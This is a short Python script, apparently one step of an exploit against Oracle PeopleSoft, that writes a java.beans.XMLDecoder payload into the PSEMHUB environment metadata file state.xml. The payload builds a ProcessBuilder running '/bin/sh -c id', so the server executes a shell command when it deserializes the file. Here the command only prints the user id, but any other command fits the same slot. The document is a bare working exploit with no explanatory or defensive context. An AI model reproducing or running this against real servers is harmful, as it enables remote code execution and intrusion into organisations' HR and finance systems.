from pathlib import Path

payload = '''<?xml version="1.0"?>
<java version="1.8.0" class="java.beans.XMLDecoder">
 <object class="java.lang.ProcessBuilder">
  <array class="java.lang.String" length="3">
   <void index="0"><string>/bin/sh</string></void>
   <void index="1"><string>-c</string></void>
   <void index="2"><string>id</string></void>
  </array>
  <void method="start"/>
 </object>
</java>
'''

Path("/home/psadm2/psft/pt/8.62/webserv/peoplesoft/applications/peoplesoft/PSEMHUB.war/envmetadata/data/environment/state.xml").write_text(payload)
